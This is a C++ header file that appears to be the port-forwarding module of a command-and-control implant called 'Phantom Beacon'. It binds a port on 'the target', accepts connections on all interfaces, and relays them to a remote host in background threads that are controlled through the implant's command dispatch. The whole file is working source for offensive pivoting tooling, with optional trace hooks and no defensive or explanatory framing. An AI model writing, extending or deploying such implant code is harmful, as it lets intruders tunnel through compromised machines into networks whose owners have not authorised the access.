#pragma once
// ============================================================================
//  portfwd.h — Phantom Beacon Internal Port Forwarding
//  ─────────────────────────────────────────────────────
//  TCP relay: binds a local port on the target and forwards traffic to a
//  remote host:port. Runs in a background thread.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <chrono>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
#endif
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <memory>
#include <cstdio>
#include "media_utils.h"

namespace portfwd {

#ifdef PHANTOM_SHELL_TRACE
#define PF_TRACE(msg) media_utils::xtrace(msg)
inline void pf_trace_n(const char* tag, long long n) {
    char b[128];
    std::snprintf(b, sizeof(b), "%s%lld", tag, n);
    media_utils::xtrace(b);
}
#else
#define PF_TRACE(msg) ((void)0)
inline void pf_trace_n(const char*, long long) {}
#endif

// Relay data between two sockets until one closes
inline void relay(SOCKET a, SOCKET b, std::shared_ptr<std::atomic<bool>> running) {
    PF_TRACE("pf:relay-enter");
    pf_trace_n("pf:relay-a=", (long long)a);
    pf_trace_n("pf:relay-b=", (long long)b);
    pf_trace_n("pf:relay-flag=", (long long)running.get());
    pf_trace_n("pf:relay-run=", (long long)running->load());
    int iter = 0;
    char buf[4096];
    while (!running->load()) {
        pf_trace_n("pf:relay-loop=", (long long)iter++);
        fd_set readFds;
        FD_ZERO(&readFds);
        FD_SET(a, &readFds);
        FD_SET(b, &readFds);

        timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int maxFd = static_cast<int>((a > b ? a : b) + 1);
        int sel = select(maxFd, &readFds, nullptr, nullptr, &tv);
        pf_trace_n("pf:relay-sel=", sel);
        if (sel <= 0) continue;

        if (FD_ISSET(a, &readFds)) {
            int n = recv(a, buf, sizeof(buf), 0);
            pf_trace_n("pf:relay-recv-a=", n);
#ifdef _WIN32
            if (n < 0) pf_trace_n("pf:relay-wsa-a=", (long long)WSAGetLastError());
#endif
            if (n <= 0) break;
            send(b, buf, n, 0);
            PF_TRACE("pf:relay-sent-b");
        }
        if (FD_ISSET(b, &readFds)) {
            int n = recv(b, buf, sizeof(buf), 0);
            pf_trace_n("pf:relay-recv-b=", n);
#ifdef _WIN32
            if (n < 0) pf_trace_n("pf:relay-wsa-b=", (long long)WSAGetLastError());
#endif
            if (n <= 0) break;
            send(a, buf, n, 0);
            PF_TRACE("pf:relay-sent-a");
        }
    }
    PF_TRACE("pf:relay-exit");
}

struct PortForward {
    int           localPort;
    std::string   remoteHost;
    int           remotePort;
    std::shared_ptr<std::atomic<bool>> stop_flag;
    std::thread   thread;

    void start() {
        stop_flag = std::make_shared<std::atomic<bool>>(false);
        thread = std::thread([this]() { run(); });
    }

    void stop() {
        PF_TRACE("pf:stop");
        if (stop_flag) *stop_flag = true;
        // join before destruction so the thread never touches freed memory
        if (thread.joinable()) thread.join();
        PF_TRACE("pf:stop-joined");
    }

private:
    void run() {
        PF_TRACE("pf:run");
#ifdef _WIN32
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

        SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSock == INVALID_SOCKET) { PF_TRACE("pf:no-socket"); *stop_flag = true; return; }

        int opt = 1;
        setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

        sockaddr_in bindAddr{};
        bindAddr.sin_family = AF_INET;
        bindAddr.sin_addr.s_addr = INADDR_ANY;
        bindAddr.sin_port = htons(static_cast<u_short>(localPort));

        if (bind(listenSock, (sockaddr*)&bindAddr, sizeof(bindAddr)) == SOCKET_ERROR) {
            PF_TRACE("pf:bind-fail");
            closesocket(listenSock);
            *stop_flag = true;
            return;
        }
        PF_TRACE("pf:bound");

        if (listen(listenSock, SOMAXCONN) == SOCKET_ERROR) {
            closesocket(listenSock);
            *stop_flag = true;
            return;
        }

#ifdef _WIN32
        u_long nonBlocking = 1;
        ioctlsocket(listenSock, FIONBIO, &nonBlocking);
#else
        int flags = fcntl(listenSock, F_GETFL, 0);
        fcntl(listenSock, F_SETFL, flags | O_NONBLOCK);
#endif

        while (!*stop_flag) {
            SOCKET clientSock = accept(listenSock, nullptr, nullptr);
            if (clientSock == INVALID_SOCKET) {
                Sleep(100);
                continue;
            }
            pf_trace_n("pf:accept=", (long long)clientSock);

            addrinfo hints{}, *result = nullptr;
            hints.ai_family = AF_INET;
            hints.ai_socktype = SOCK_STREAM;
            hints.ai_protocol = IPPROTO_TCP;

            std::string portStr = std::to_string(remotePort);
            if (getaddrinfo(remoteHost.c_str(), portStr.c_str(), &hints, &result) != 0) {
                PF_TRACE("pf:gai-fail");
                closesocket(clientSock);
                continue;
            }
            PF_TRACE("pf:gai-ok");

            SOCKET remoteSock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
            if (remoteSock == INVALID_SOCKET) {
                freeaddrinfo(result);
                closesocket(clientSock);
                continue;
            }

            if (connect(remoteSock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
                PF_TRACE("pf:connect-fail");
                closesocket(remoteSock);
                freeaddrinfo(result);
                closesocket(clientSock);
                continue;
            }
            freeaddrinfo(result);
            PF_TRACE("pf:connected");

            // Per-connection relay thread keeps the stop flag alive via shared_ptr
            pf_trace_n("pf:spawn-flag=", (long long)this->stop_flag.get());
            std::thread([clientSock, remoteSock, stop_flag = this->stop_flag]() {
                relay(clientSock, remoteSock, stop_flag);
                PF_TRACE("pf:relay-close");
                closesocket(clientSock);
                closesocket(remoteSock);
            }).detach();
            PF_TRACE("pf:relay-spawned");
        }

        closesocket(listenSock);
    }
};

// Active port forwards (managed from command dispatch)
inline std::vector<PortForward*> active_forwards;

inline std::string start_forward(int localPort, const std::string& remoteHost, int remotePort) {
    PF_TRACE("pf:start");
    auto* pf = new PortForward();
    pf->localPort = localPort;
    pf->remoteHost = remoteHost;
    pf->remotePort = remotePort;
    pf->start();
    active_forwards.push_back(pf);
    return "Port forward started: 0.0.0.0:" + std::to_string(localPort) +
           " -> " + remoteHost + ":" + std::to_string(remotePort);
}

inline std::string stop_all_forwards() {
    for (auto* pf : active_forwards) {
        pf->stop();
        delete pf;
    }
    active_forwards.clear();
    return "All port forwards stopped.";
}

}  // namespace portfwd
